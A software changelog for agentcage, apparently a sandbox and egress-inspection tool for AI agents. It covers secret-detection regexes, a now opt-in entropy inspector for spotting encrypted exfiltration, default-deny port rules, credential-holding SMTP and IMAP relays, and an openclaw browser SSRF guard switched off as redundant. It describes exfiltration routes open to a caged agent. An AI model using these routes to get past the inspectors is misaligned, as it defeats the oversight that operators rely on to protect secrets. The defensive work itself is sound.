- The Shannon-entropy inspector is now **opt-in** rather than on-by-default. Pre-change, every cage that didn't explicitly set `entropy: false` had the inspector loaded in `block` mode at threshold `7.0` over request bodies, URL query parameters, and URL path segments. Post-change, the inspector is loaded only when the operator explicitly opts in — either by adding a top-level `entropy: {}` block to `cage.yaml` (empty dict = defaults, or a non-empty dict to override) or by listing `- name: entropy` under the `inspectors:` section. A bare config with no entropy key (and no `inspectors:` entry naming entropy) gets four built-in inspectors loaded — `domain`, `secrets`, `body-size`, `content-type` — but not `entropy`. The `entropy: false` legacy disable continues to be a no-op for forward compatibility.
- **Security implication**: the entropy inspector is the only built-in that catches encrypted or compressed payload exfiltration smuggled inside an otherwise-allowlisted HTTP request — random/compressed bytes hiding in a JSON field, a URL parameter, or a path segment. Flipping the default to opt-in removes that automatic detection layer on every new cage and on every existing cage that didn't have an explicit `entropy:` section pinning the prior behavior. The other inspectors stay strict: `secrets` (regex-based key detection) still blocks every leaking pattern it knows about, `content-type` (text-with-high-entropy + base64-blob scan) still flags obvious binary smuggling in text bodies, `domain` still enforces the host allowlist, and `body-size` still caps payload bytes. Entropy was specifically the layer most likely to false-positive on legitimate high-entropy strings — Google API pagination tokens, JWTs, opaque cursors, base64-encoded UUIDs, signed S3 presigned-URL query params — and the friction was significant enough that operators were accumulating per-host content-type exemptions, URL allowlists, and `entropy: false` lines just to clear the inspector. The team's call: cleaner default, with the protection one line away for any cage that wants it.
- **Migration**: to keep the prior on-by-default behavior verbatim, add either of the following to your `cage.yaml`:

  ```yaml
  # Option 1: top-level key, defaults applied (threshold 7.0, block mode)
  entropy: {}

  # Option 2: top-level key, explicit overrides
  entropy:
    threshold: 7.0
    action: block

  # Option 3: under the inspectors list (also works alongside other inspectors)
  inspectors:
    - name: entropy
  ```

  All built-in agentcage scaffolds (`openclaw`, `picoclaw`, `nanoclaw`, `claude-code`, `codex`, `alpine-curl`, `scaffold-starter`) already list `- name: entropy` under `inspectors:`, so cages created from those scaffolds keep their entropy inspector loaded with no further action. The behavior change only affects custom `cage.yaml` files that relied on the previous default-on behavior without an explicit opt-in. For cages that do opt in, the URL-allowlist wildcarding from #99 is the cleanest way to silence per-host false positives without disabling the inspector entirely.

## [0.15.4] - 2026-05-13

### Fixed
- `brave_api_key` regex no longer false-positives on base64-encoded image bytes sent to `api.anthropic.com` (and other JSON or binary upload targets). The previous pattern `BSAI[a-zA-Z0-9_-]{20,255}` collided with random `BSAI...` substrings inside ~2 MB JPEGs at roughly a 40% hit rate, hard-blocking every Anthropic vision API batch with `{"blocked":true,"reason":"secret detected: brave_api_key"}`. Two-part fix: (1) the pattern is now `(?<![A-Za-z0-9_-])BSAI[a-zA-Z0-9_-]{28}(?![A-Za-z0-9_-])`, locked to Brave's documented 32-char total length and surrounded by negative lookbehind/lookahead on the base64 alphabet so a coincidental `BSAI...` substring inside a base64 blob no longer matches; (2) the secrets inspector now skips `body_text` scanning when the request's `Content-Type` is `image/*`, `audio/*`, `video/*`, `application/octet-stream`, or `application/pdf` — URL and headers are still scanned, so a real secret leaking through those still gets caught even on a binary-body request. Empirically reproduced on a jacque (Matrix bot) image-tool batch that lost ~17 photo uploads in a row before the fix.

### Reverted
- Reverts 0.15.2 in full: `container.graceful_restart_signal`, the `Wants=` downgrade on cage/proxy quadlets, the `_update_dns_quadlet` no-cage-restart simplification, and the openclaw scaffold's `entrypoint.sh exec`. The motivating workload (openclaw 2026.5+ in-process SIGUSR1 restart) turns out to leave the gateway's command lane stuck in `state.draining = true` after the reload completes, so every subsequent agent invocation hits `GatewayDrainingError` and replies with the stub "⚠️ Gateway is restarting" banner instead of running inference. Until openclaw's SIGUSR1 path clears that flag reliably, `agentcage cage restart` does the historical full-unit restart for all three containers — losing in-memory olm sessions but ending in a workable state, which is the safer trade today.

## [0.15.3] - 2026-05-09

### Added
- `agentcage cage update --no-cache` (and `cage create --no-cache`) flag forces a full image rebuild, passing `--no-cache` through to `podman build` so every layer is rebuilt from scratch. Useful after pulling a fresh agentcage release that changed the Containerfile or any of its build context — without it, podman's layer cache will short-circuit the rebuild and the new Containerfile directives (e.g. a fresh `ENTRYPOINT`) silently won't take effect, leaving operators chasing why a new release didn't change runtime behavior. Default is unchanged (cache on); only opt in when you specifically want a clean rebuild.
- `agentcage cage update --pull` (and `cage create --pull`) flag forces `podman build --pull=always`, re-fetching the Containerfile's `FROM` base image from the registry instead of reusing the locally cached copy. Independent from `--no-cache`: `--no-cache` invalidates podman's per-layer build cache, `--pull` invalidates the base-image cache. Combine both (`--no-cache --pull`) for a fully clean rebuild. Motivating case: a cage's `FROM ghcr.io/openclaw/openclaw:latest` was stuck on an old `:latest` digest in the local image store even after `cage update --no-cache`, because layer-cache invalidation does not re-resolve the base ref against the registry; the new flag does.

## [0.15.1] - 2026-05-09

### Changed
- The DNS sidecar's allowlist no longer lives on dnsmasq's command line. The per-domain `--server=/<domain>/<upstream>` flags that were rendered into `<cage>-dns.container` are gone; in their place, the quadlet mounts a new sidecar file at `/etc/dnsmasq-allow.conf` (host path: `~/.config/agentcage/cages/<name>/dns-allowlist.conf`) and runs dnsmasq with `--servers-file=/etc/dnsmasq-allow.conf`. The file is dnsmasq's native config-format — one `server=/<domain>/<upstream>` line per (allowed-domain × upstream-server) pair — and is written by a new `state.save_dns_allowlist(name)` helper. Net effect: the systemd unit content is now stable across domain edits, so `agentcage domain add` / `domain rm` and `agentcage cage start` / `cage restart` can apply allowlist changes with just a file rewrite plus `systemctl restart` — no `daemon-reload`, no unit-file churn, no surprise cascade beyond the existing `Requires=` chain. The `_update_dns_quadlet` helper still exists as the public reload contract for `domain add` / `domain rm` (and is what existing tests mock), but its implementation reduces to "write the sidecar file, run a cheap migration check, restart services if running."
- One-time migration: existing cages have a quadlet that bakes the allowlist into the command line and lacks the new mount. The first `cage restart` (or the first `domain add` / `domain rm`) under this version detects the mismatch via the new `_ensure_dns_quadlet_current(cfg)` helper, rewrites the unit to the new shape, and runs one `daemon-reload`. From then on the quadlet stays untouched.

### Fixed
- `agentcage cage start` and `agentcage cage restart` now regenerate `proxy-config.yaml` AND `dns-allowlist.conf` from `cage.yaml` before bouncing services. Pre-fix, the proxy container always read the on-disk `proxy-config.yaml` it was last given and dnsmasq always read the per-domain flags baked into the on-disk quadlet, so any divergence between `cage.yaml` (the source of truth) and either of those derived artifacts would survive a `cage restart` and a stop/start cycle. Symptom seen in the wild: domains added to `cage.yaml` (whether by a hand-edit, an out-of-process tool, or an older agentcage version that wrote `cage.yaml` without calling `save_proxy_config`) appeared in `agentcage domain list` and in `cage.yaml` on disk, but were rejected by both the proxy (`domain not in allowlist`) and the DNS sidecar (NXDOMAIN). Operators reasonably ran `cage restart` to apply the change and saw no effect — the restart just re-mounted the same stale derived state. Now restart and start are true "re-apply current cage.yaml" operations, and in the steady state they don't even touch systemd because the quadlet is data-stable.

## [0.15.0] - 2026-05-08

### Changed (BREAKING)
- The proxy container now installs a default-deny `filter:FORWARD` policy on every cage. Cage→external traffic is dropped unless the destination port is listed in `ports.tcp.allow`, `ports.tcp.passthrough`, or `ports.udp.allow`. Pre-change, only ports `80` and `443` were REDIRECTed into mitmdump's transparent listener — every other TCP and UDP port silently L3-forwarded uninspected. The cage's `domains.allow` gated *which hosts* could be reached but said nothing about *which ports* could exit. An agent that resolved an allowed hostname could exfiltrate over any port (NTP, custom binary protocols, QUIC/HTTP3) with the audit pipeline blind. The new default-deny posture closes that gap.
- **Migration impact**: every existing cage gets the new posture on the next `agentcage cage update`. Cages that talk *only* on the default `ports.tcp.allow` (`[80, 443]`) keep working unchanged. Cages that depend on outbound on any other port — NTP for clock sync (`123/udp`), Postgres (`5432/tcp`), IMAP (`993/tcp`), QUIC/HTTP3 (`443/udp`), custom services — must add those ports to `ports.tcp.allow`/`ports.tcp.passthrough` (TCP) or `ports.udp.allow` (UDP) or lose connectivity. DNS is unaffected: cages talk to the sidecar dns container directly on the same subnet and never traverse the proxy's FORWARD chain.

### Added
- `ports.tcp.allow` config field lists the TCP destination ports the cage may reach. Default `[80, 443]` preserves the historical HTTP/HTTPS coverage; extend to permit non-standard services (`8448` for a Matrix homeserver, `5432` for Postgres, etc.). Inspected ports (= `tcp.allow - tcp.passthrough`) become `iptables nat:PREROUTING REDIRECT` rules that divert TCP traffic into mitmdump's transparent listener and run through `audit.jsonl`, the inspector chain, and the secret injector. Reserved ports for the inspected set (`8443` mitmdump transparent, `8080` mitmdump HTTP-proxy, any `protocol_relays[*].listen` port, any `container.ports[*].container_port` inbound forward) are rejected by `validate_config` — moving them to `tcp.passthrough` is the supported escape hatch. Per-entry validation: integers only (YAML strings, booleans, floats rejected), 1-65535 range, no duplicates. Setting `ports.tcp.allow: []` disables transparent capture entirely (operator opt-out for L7-only setups) and emits a config validation warning. See `docs/proxy-audit-ports.md` for the worked example and trade-off discussion.
- `ports.tcp.passthrough` config field lists the subset of allowed TCP ports that bypass mitmdump inspection. Mirrors `domains.passthrough` semantics: a passthrough port not explicitly in `tcp.allow` is auto-merged into the effective allow set at quadlet generation with a validation warning. Each entry installs one `iptables -A FORWARD -p tcp --dport N -j ACCEPT` rule. Reserved ports are NOT rejected here — putting `8443` or a `protocol_relays[*].listen` port in `tcp.passthrough` is fine because passthrough entries never get a REDIRECT rule and don't conflict with locally-bound listeners.
- `ports.udp.allow` config field lists the UDP destination ports the cage may reach. UDP is never inspected (mitmdump is HTTP-only); every entry installs one `iptables -A FORWARD -p udp --dport N -j ACCEPT` rule and is forwarded uninspected. Independent of `tcp.allow` — the same port number can appear in both, which is the supported way to expose HTTP/3 (`tcp.allow: [443]` audits HTTP/2, `udp.allow: [443]` lets HTTP/3 reach upstream uninspected). Required for any UDP-using protocol — NTP (`123`), QUIC (`443`), SNMP (`161`), syslog (`514`), STUN/TURN, etc. Default empty so UDP is opt-in.
- Outbound ICMP echo-request is always permitted (`iptables -A FORWARD -p icmp --icmp-type echo-request -j ACCEPT`) so `ping` from inside a cage works for diagnostics. Replies ride the existing `ESTABLISHED,RELATED` rule. No config knob to disable.
- `ip6tables -P FORWARD DROP` failsafe is installed on every cage. Today's podman networks are IPv4-only (`10.89.x.0/24`), so this is a latent-gap closure rather than active filtering — IPv6 traffic the cage might attempt is dropped at the proxy regardless.

### Fixed
- `load_config` now structurally validates the nested `ports` shape. Pre-fix, a malformed config like `ports: "yes"` crashed with `AttributeError`, `ports.tcp: 443` crashed with `TypeError`, and most concerning, `ports.tcp: [80, 443, 8448]` (operator forgot the `allow:` key) silently parsed as the default `[80, 443]` — the operator's intent to allow port 8448 was dropped without any warning, and Matrix federation traffic would then be silently blocked by the new default-deny FORWARD policy. Each level (`ports`, `ports.tcp`, `ports.udp`) now requires a mapping; non-mappings raise a clean `ValueError` with a hint pointing the operator at the right shape.
- `proxy.container.j2` now installs `iptables -P FORWARD DROP` as the first rule in the FORWARD chain, before any `-A FORWARD ... ACCEPT` rules. Pre-fix, the policy was set last via `&&`-chained `ExecStartPost`; if any earlier `iptables` invocation failed (kernel module missing, transient failure), the chain short-circuited before reaching the policy line and the kernel default ACCEPT remained — fail-open. The default-deny posture is the headline of this feature; the failure mode now matches.
- Reserved-port violation reporting in `validate_config` is now deterministic. Pre-fix, multiple violations in `ports.tcp.allow` (e.g. both `8080` and `8443`) reported a non-deterministic "first violation" because Python set iteration order varies. Now sorted ascending, so the smallest violating port is always reported first.

## [0.14.3] - 2026-05-04

### Changed
- SMTP relay default for `policy.bypass_inspectors_for_allowlisted` is now `["secrets", "entropy", "content-type"]` (was `["secrets", "entropy"]`). The `content-type` inspector flags base64 chunks in `text/plain` bodies as an exfil signal — a strong heuristic for HTTP, a false-positive for email where PGP signatures, quoted forwards, copied tokens, and long URLs routinely produce 600+ char base64-looking content in plaintext. With the new default, an allowlisted recipient can receive that legitimate human content; with no allowlist the inspector still runs strictly. `body-size` always applies as a structural cap. To restore the prior stricter default for a relay, set `policy.bypass_inspectors_for_allowlisted: ["secrets", "entropy"]` explicitly.

## [0.14.2] - 2026-05-04

### Fixed
- SMTP relay: `send_rate_limit` now counts upstream-accepted deliveries, not raw DATA attempts. Pre-fix, the rate limiter reserved a slot before the inspector chain and upstream delivery, so an inspector-blocked or oversize-rejected message still consumed an hourly quota slot. A client that hit a content rule (e.g. himalaya tight-loop retrying a `text/plain` mail with a 600+ char base64 chunk that the `content-type` inspector flagged) could exhaust its hourly cap in seconds with zero successful sends, then be locked out for an hour. Now the rate limiter's `take()` is paired with a `release()` that's called on every failure path (oversize, inspector block, upstream error, DATA reception timeout) so only actual deliveries count against the quota. Caught in production on jacque after the SMTP relay deploy.

## [0.14.1] - 2026-05-04

### Fixed
- SMTP relay: EHLO response now advertises `AUTH PLAIN LOGIN`. Real-world clients (himalaya, msmtp) refuse to send mail when the server doesn't expose any auth method, even on a plaintext loopback where they don't strictly need to authenticate. The advertised AUTH is still intercepted and forged 235 by the relay — no credential bytes reach upstream — but the client now knows the channel is "authenticated" enough to proceed. Caught while running the first real himalaya-from-cage send through the relay.

## [0.14.0] - 2026-05-04

### Added
- `protocol_relays` now supports `type: smtp`. The SMTP relay holds the upstream submission credential, opens an authenticated TLS connection to the upstream (port 465 / implicit TLS / `AUTH PLAIN`), and proxies cage-side SMTP transactions while applying policy at command granularity. Without this relay an SMTP-able cage is a wide-open exfiltration channel; the relay closes that channel by gating `MAIL FROM` against `sender_allowlist`, gating each `RCPT TO` against `recipient_allowlist` (`addresses` + `domains` with subdomain suffix matching, per-recipient decisions per RFC 5321), capping `max_recipients` per transaction, capping `max_message_bytes` on `DATA`, capping `send_rate_limit` on accepted deliveries, and — most importantly — running every `DATA` payload through the proxy's existing inspector chain (`secrets`, `entropy`, `content-type`, `body-size`) before forwarding upstream. A leaked Anthropic key in an outbound email body is blocked the same way it would be in an HTTP request body. The `domain` inspector is intentionally skipped (its host-allowlist is HTTP-shaped; the SMTP equivalent is `recipient_allowlist`). When the allowlist is non-empty and every recipient in the transaction matched it, the relay skips the inspectors named in `policy.bypass_inspectors_for_allowlisted` (default `["secrets", "entropy"]`) so legitimate user content (forwarded recovery codes, base64 attachments) reaches the trusted recipient; `body-size` and `content-type` always run as structural caps; with no allowlist the bypass cannot trigger and the chain runs strictly. The relay does not advertise `STARTTLS` or `AUTH` to the cage (the connection is loopback inside the proxy and the relay handled real auth upstream); cage-side `AUTH PLAIN`/`AUTH LOGIN` attempts are intercepted and forged `235` without forwarding any credential bytes. Decisions land in the existing `audit.jsonl` pipeline as structured JSON (`kind: smtp_command` / `kind: smtp_data` / `kind: smtp_data_flag` / `kind: smtp_data_bypass`). See `docs/configuration.md` ("SMTP-specific policy" + "SMTP relay behavior").
- `relays/__init__.py` exposes the `smtp` type via the registry's lazy-load path, mirroring `imap`. Built-in relay types are now `{imap, smtp}`.

### Changed
- `ImapRelay.__init__` and `SmtpRelay.__init__` both accept an `inspectors=` kwarg from the addon. IMAP ignores it (its policy is byte-level / per-command, not body-shape). SMTP runs the chain on `DATA` payloads.
- `Agentcage._start_protocol_relays` filters `DomainInspector` out of the chain it passes to relays — host-allowlist semantics don't translate to non-HTTP traffic, and the SMTP equivalent is `recipient_allowlist`.
- Both relays support `policy.idle_timeout_seconds` to bound how long a session can sit silent. Defaults: SMTP=300 (RFC 5321 §4.5.3.2 floor), IMAP=1800 (lets RFC 2177 IDLE heartbeats through). The IMAP relay only enforces the timeout pre-bridge — once auth completes and bytes start flowing, IDLE legitimately sits quiet for ~29 minutes between heartbeats. SMTP enforces it on every readline (cage and upstream sides). On timeout the cage gets `421 4.4.2 idle timeout` (SMTP) or `* BYE upstream silent` (IMAP), and an audit entry is recorded.

### Fixed
- SMTP relay: `_connect_upstream()` failures (TLS handshake, AUTH rejection) are now caught at the same level as `deliver()` failures. Pre-fix the cage's TCP connection just dropped with no SMTP response and no audit entry; post-fix the cage gets `451 4.4.0 upstream temporarily unavailable` and `audit.jsonl` records `kind: smtp_data, decision: upstream_error, error: <str>`. Mirrors the equivalent IMAP fix from the 0.13 series.
- SMTP relay: `_connect_upstream()` no longer leaks the upstream socket when `handshake()` raises. Pre-fix, an AUTH-rejected handshake left the upstream's handler reading from a half-open connection until kernel TCP keepalive (~60s) detected it. Post-fix, the relay closes the writer in a `try/except/raise` block before propagating the error.

## [0.13.3] - 2026-05-04

### Fixed
- dnsmasq now resolves `proxy.cage.local` to the proxy container's network IP. The 0.13.0 docs and `protocol_relays` examples all point cage clients at `proxy.cage.local:1143`, but the hostname was never wired into the DNS sidecar — under allowlist mode it fell through to the `198.51.100.1` placeholder, so the cage's IMAP client got connection timeouts. Now hard-coded as `--address=/proxy.cage.local/{ip_proxy}` in the dns.container template, applied in both allowlist and open-DNS modes.

## [0.13.2] - 2026-05-04

### Fixed
- `Containerfile.proxy` now COPYs the new `proxy/relays/` directory into the proxy image. Without this the proxy container ships without the relay implementations, so the addon's `_start_protocol_relays()` raises `ModuleNotFoundError: No module named 'relays'` at startup and crashes the proxy. Mirrors the existing COPY for `transforms/`.

## [0.13.1] - 2026-05-04

### Fixed
- `save_proxy_config` now passes the `protocol_relays` block through to the proxy container's filtered config. Without this the `_PROXY_KEYS` allowlist dropped it silently, so the addon's `_start_protocol_relays()` saw an empty list and the IMAP relay never bound its listener — the cage would hit "connection refused" on `proxy.cage.local:1143`. Caught while deploying the first real cage on top of 0.13.0.

## [0.13.0] - 2026-05-04

### Added
- `protocol_relays:` — stateful in-proxy listeners for non-HTTP credentials. The first relay shipped is `imap`: the cage connects to a localhost address inside the proxy container, the relay opens an authenticated TLS connection upstream and bridges the post-auth byte stream while applying policy. Greets the cage with `* PREAUTH ...` so compliant clients skip LOGIN; intercepts any spurious LOGIN/AUTHENTICATE the cage sends and forges `OK` so credentials never reach upstream. Policy: `readonly: true` blocks state-mutating commands (APPEND/DELETE/STORE/EXPUNGE/CREATE/RENAME/MOVE/COPY) and the write subcommands of `UID` (STORE/COPY/MOVE/EXPUNGE) while leaving `UID FETCH`/`UID SEARCH` reads available — modern clients (himalaya, mutt, isync) rely on UID-addressed reads. `folder_allowlist: [...]` restricts SELECT/EXAMINE/STATUS targets; `conn_rate_limit: "30/min"` caps connections per window. The PREAUTH greeting forwards the upstream's advertised CAPABILITY list (with `COMPRESS=DEFLATE` stripped so the relay retains command-level visibility) instead of advertising a minimal `IMAP4rev1` set, so clients use IDLE/MOVE/NAMESPACE/etc. when the upstream supports them. Per-command decisions land in the existing `audit.jsonl` pipeline as structured JSON entries, alongside HTTP decisions. Upstream connect failures surface a clean `* BYE upstream unreachable` to the cage instead of a silent close. Relay-start failures (port conflicts, init errors) are reported via the audit pipeline rather than left as unhandled asyncio task exceptions. On proxy shutdown, the addon's `done()` hook drains in-flight relay sessions cleanly so long-lived IDLE clients receive a proper close instead of a TCP reset. Credentials named in `auth.user_source`/`auth.password_source` are auto-stripped from the cage's `podman_secrets`/`env` and surfaced as `Secret=` directives on the proxy quadlet so only the proxy holds them. See `docs/configuration.md` ("Protocol relays").

## [0.12.1] - 2026-05-04

### Added
- `content-type` inspector now supports a `host_exempt_content_types` config key, mirroring the same knob on the `entropy` inspector. Lets a cage permit legitimate high-entropy bodies declared as a "text-like" content-type — e.g. `multipart/form-data` PDF uploads to a paperless-ngx host — without weakening the inspector for any other host. Suffix-matched, off by default. See `docs/configuration.md` ("Content-type inspector").
- `body-size` inspector now supports a `host_max_bytes` config key. Per-host byte limits (subdomain suffix matching; most-specific match wins) override the global `max_request_body` for the matching host. Set a host to `0` to disable the cap for that host entirely. Lets cages allow legitimate large uploads to specific destinations — e.g. document uploads to a paperless-ngx host — while keeping the global cap conservative for everything else. See `docs/configuration.md` ("Body-size inspector").

## [0.12.0] - 2026-05-04

### Added
- `secret_injection` rules now support a `transform` discriminator that converts the underlying secret into a derived value at request time, instead of substituting the literal stored value. The first transform shipped is `google-jwt-bearer`, which holds a Google service-account private key in proxy memory and mints short-lived OAuth2 access tokens via the JWT-bearer flow on demand. The cage agent only ever sends `{{PLACEHOLDER}}`; it never holds the SA key. Tokens are cached in-process, refreshed before expiry, and the mint rate is capped per rule. For transform rules, the literal-value block treats the underlying secret as never-on-the-wire — including to `inject_to` domains — because the cage is not supposed to know it. The transform's `audience` (= JWT `aud` claim and POST destination) is allowlisted to `oauth2.googleapis.com` / `accounts.google.com` so a hostile or malformed SA JSON cannot redirect the signed assertion to an attacker-controlled host. See `docs/configuration.md` ("Transforms").
- Built-in secrets-inspector pattern `google_oauth_access_token` (`ya29.<...>`) with `googleapis.com` / `google.com` as the allowed exfil domains. Catches minted access tokens leaking to non-Google hosts the same way `anthropic_key` is caught for Anthropic.

### Changed
- `tests/conftest.py` now stubs `mitmproxy` at collection time so tests for proxy modules can run on the host without the proxy container's runtime deps regardless of collection order. Previously this stub lived in `tests/test_defaults.py` and only worked when that file was collected first.
- `Containerfile.proxy` now COPYs the new `proxy/transforms/` directory into the proxy image and pins `cryptography>=41` explicitly. Without this, `secret_injection` rules with `transform: google-jwt-bearer` would fail at addon load with `ImportError`. The explicit `cryptography` pin also makes the proxy stop silently relying on mitmproxy's transitive dep.

## [0.11.0] - 2026-05-03

### Fixed
- e2e Phase 8: `8.4 self-restart SIGUSR1` rewritten for openclaw 2026.5+. The upstream change collapses the supervisor + `openclaw-gateway` worker into a single `openclaw` process and switches to in-process restart in containers (deliberate — `restart mode: in-process restart (container: use in-process restart to keep PID 1 alive)`), so the previous PID-delta witness can no longer fire. The new test sends SIGUSR1 to `^openclaw$`, asserts openclaw logs `received SIGUSR1; restarting` (proves the signal was authorized via `commands.restart`, which defaults to true), and probes the gateway readiness endpoint to confirm recovery.

### Removed
- `agentcage completions <shell>` wrapper command. Click ships native shell completion via the `_AGENTCAGE_COMPLETE=<shell>_source agentcage` env-var protocol; the wrapper added zero capability over upstream and created a maintenance surface that could drift from Click. See [Shell completion](docs/cli.md#shell-completion) in the CLI reference for the env-var pattern.
- `agentcage cage edit` — trivial `click.edit()` wrapper. Use `$EDITOR <path>` (path visible via `cage show`) followed by `agentcage cage update <name>` instead.

## [0.10.6] - 2026-04-26

### Changed
- `agentcage domain add` now accepts multiple domains in a single invocation (e.g. `agentcage domain add my-cage foo.com bar.com baz.com`). Config is written and the cage is reloaded exactly once for the whole batch, replacing the previous one-reload-per-domain behavior. Single-domain calls are unchanged.

## [0.10.5] - 2026-04-21

### Fixed
- openclaw scaffold: default `openclaw.json` now sets `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork: true`. openclaw's browser plugin refuses every navigation when `HTTP_PROXY`/`HTTPS_PROXY` is set (error: `Navigation blocked: strict browser SSRF policy cannot be enforced while env proxy variables are set`). In agentcage, egress is already policed by the mitm proxy + domain allowlist + inspectors, so this guard is redundant and purely blocks the browser tool. Opting out restores browser-tool functionality; the cage's own egress controls remain authoritative.

## [0.10.4] - 2026-04-20

### Added
- `cage update` auto-bumps scaffold-declared untagged base image tags on every run, tracking upstream instead of freezing on the tag current at `cage create`. Scaffold.yaml's `build_args` is authoritative: untagged = auto-bump, explicit tag = respect the author's pin. Offline updates preserve the existing pin (regression-critical).
- `infer_scaffold_from_image()` discovers the scaffold name for pre-existing cages from the `localhost/agentcage-scaffold-<NAME>:...` image naming convention, so legacy cages benefit without manual migration. New cages get the scaffold persisted to `metadata.json` on create.
- `resolve_build_args()` in `agentcage.registry` centralizes tag resolution previously duplicated across `cli.py` update, `services.py` build, and `init.py` scaffold setup.

### Changed
- `cage update` preserves existing metadata instead of overwriting — `scaffold` and `network_octet` survive updates.
- openclaw scaffold compatibility with `ghcr.io/openclaw/openclaw:2026.4.15+` base images: skip the `npm install --omit=dev` step when runtime deps are already hoisted (new upstream layout); add `/app/node_modules/openclaw -> /app` symlink so the bundled matrix extension's `openclaw/plugin-sdk/...` self-references resolve.
- openclaw scaffold `entrypoint.sh` degrades gracefully when `/home/node/.pki` isn't writable: the mitmproxy CA install is best-effort and a stderr warning is emitted so operators can see TLS inspection for browser traffic is degraded.
- `_SCAFFOLD_IMAGES` hardcoded dict removed; scaffold.yaml is now the single source of truth for scaffold → upstream-image mapping.
- `render_config()` and `run_scaffold_setup()` no longer thread an `image_tag` through call sites — tag resolution happens inside `run_scaffold_setup` via the shared helper.

### Fixed
- Suppress the noisy `warning: could not resolve latest tag for localhost/...` that fired on every `cage update` for scaffold-built local image refs that never exist in a real registry.

## [0.10.3] - 2026-03-27

### Improved
- E2E test reliability: parallelize test phases, add local mock httpbin server, and fail-fast on first error

## [0.10.2] - 2026-03-22

### Fixed
- OpenClaw container no longer crashes on SIGUSR1-based self-restart: tini is now PID 1 with a restart loop in `entrypoint.sh`, so config changes via the web UI don't kill the container
- `cage update` automatically refreshes scaffold build files (Containerfile, entrypoint.sh) and updates the container command — existing cages pick up fixes with just `agentcage cage update <name>`
- `cage create`, `cage update -c`, and `agentcage init` now copy all build context files alongside the Containerfile, not just the Containerfile itself

## [0.10.1] - 2026-03-21

### Added
- `agentcage doctor` command: diagnose system health, check prerequisites, and provide distro-aware remediation hints
- Custom scaffolds: `agentcage scaffold create/list/show/edit/delete/export` for user-defined cage templates
- Three-tier scaffold resolution: project-local → user → built-in
- `agentcage update` command: self-update the CLI from PyPI
- `-i/--interactive-domains` flag on `agentcage run`: approve blocked domains interactively at runtime

### Fixed
- Stabilize flaky E2E tests (4.3 domain hot-reload, 5.2 subnet isolation) with exponential backoff and proxy readiness checks
- `_version_tuple` crash on pre-release version strings
- `scaffold edit` now opens the config file instead of the directory

## [0.10.0] - 2026-03-21

### Added
- Coding agent scaffolds: pre-built templates for common agent frameworks
- `agentcage run` command: one-shot cage creation, build, and execution
- Polished `agentcage run` CLI output: box-drawn banner, spinner during builds, ✓/✗ status lines, compact info summary
- `agentcage run -v/--verbose` flag to show full build output
- `agentcage run` VM isolation support (`--isolation vm`)
- Version banner on `agentcage` and `agentcage --help`

### Fixed
- Build scaffold images inside VM instead of host Podman when using VM isolation

## [0.9.2] - 2026-03-20

### Added
- Modular E2E test suite (`tests/e2e/`) with 7 phases covering container and VM modes
- E2E CI workflow — container tests (phases 1-6) run on every PR via GitHub Actions

### Fixed
- `domain add`/`domain rm` crash: DNS quadlet regenerated with wrong subnet IP when hash collision shifted the octet at deploy time
- HAR capture `Permission denied` in rootless Podman — capture directory ownership now set via `ExecStartPre` with virtiofs fallback
- VM mount isolation: replaced blanket `~` mount with targeted read-only/read-write mounts; `~/.ssh`, `~/.gnupg`, `~/.aws` no longer accessible inside VMs
- `cage destroy` no longer deletes the shared config directory
- Shell-quote filenames in VM quadlet deployment commands
- Journal access uses group-based permissions instead of world-readable

### Security
- Lima VM template no longer exposes host SSH keys, GPG keys, or AWS credentials
- Config directory (`~/.config/agentcage`) mounted read-only in VMs
- Volumes targeting sensitive directories (`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.docker`) are rejected with a clear error
- Default port binding changed from `0.0.0.0` to `127.0.0.1`
- Narrow `net.ipv4.ip_unprivileged_port_start` sysctl from 0 to 80
- Validate container image references in config (reject `latest` with registry, block `docker.io/library` prefix typos)
- Pin Ubuntu cloud image digests in Lima template
- Restrict permissions on `pending_secrets.json`

## [0.9.1] - 2026-03-18

### Added
- `cage create --set-secret KEY=VALUE` — set secrets during creation, no separate restart needed
- `VmPodman` — secret commands route through the VM's Podman for VM-mode cages

### Changed
- Secret commands (`set`, `list`, `rm`) now require the cage to exist first
- Removed `agentcage build` CLI group
- Install script: macOS skips Podman and Podman machine (uses Lima instead)
- Scaffold guides updated: create cage first, then set secrets

### Fixed
- Shell injection in `_bridge_secrets` (piped via stdin)
- Command injection in `os.system()` (`shlex.quote`)
- Heredoc injection in quadlet transfer (base64 encoding)
- `cage exec/shell` checks `isatty()` in all code paths
- Host Podman calls guarded for VM mode
- VmConfig defaults aligned between dataclass and `load_config()`

## [0.9.0] - 2026-03-18

### Added
- **Lima VM backend** — new `isolation: vm` mode using Lima to manage Linux VMs with Podman + quadlets inside. Works on both Linux (QEMU/KVM) and macOS (Apple Virtualization.framework).
- **macOS support** — agentcage now runs on macOS via the VM backend. Only `limactl` is required on the host; Podman runs inside the VM.
- `cage exec` and `cage shell` work for VM-mode cages via `limactl shell` + `podman exec`
- `cage logs` and `cage audit` work for VM-mode cages via `limactl shell` + `journalctl`
- Lima prerequisites check for QEMU and `/dev/kvm` on Linux
- Secret bridging from host Podman store into VM's Podman store
- End-to-end test for Lima VM backend (`tests/e2e_lima.sh`)

### Changed
- **BREAKING**: `isolation: firecracker` is removed. Existing configs are silently migrated to `isolation: vm`. The `agentcage firecracker setup` command is removed.
- VM defaults: 4 vCPUs, 4 GiB RAM (previously 2/2 GiB for Firecracker)
- `Sysctl=net.ipv4.ip_unprivileged_port_start=0` added to proxy container for low-port binding in reverse proxy mode
- Host Podman is optional for VM mode — only needed for `agentcage secret set`

### Removed
- Firecracker backend and all associated code (binaries, kernel, network, rootfs, secrets, vmconfig)
- `agentcage firecracker setup` CLI command
- TAP/bridge networking, `agentcage-nethelper`, root/sudo requirement for VM isolation

### Fixed
- `cage shell` now checks `isatty()` before passing `-it` flags (fixes piped commands)

## [0.8.1] - 2026-03-14

### Added
- **`cage stop` / `cage start`** — stop and start cages without destroying them
- **`cage show`** — inspect cage config and status (aliases: `describe`, `inspect`)
- **`cage shell`** — open an interactive shell in a cage container (auto-detects bash/sh)
- `delete` alias for `cage destroy` (kubectl compatibility)
- `--json-lines` hidden alias on `cage audit`, `--json` hidden alias on `cage har` for cross-command consistency
- `-n/--max-entries` on `cage audit` (replaces `--lines`; `--lines` kept as hidden alias)

### Changed
- **`cage logs` no longer follows by default** — use `-f/--follow` to stream logs in real time (matches systemctl/kubectl/podman behavior). `--no-follow` is kept as a hidden no-op for backward compatibility
- `domain` group help text changed from "allowlists" to "filters" (the group handles both allow and block modes)
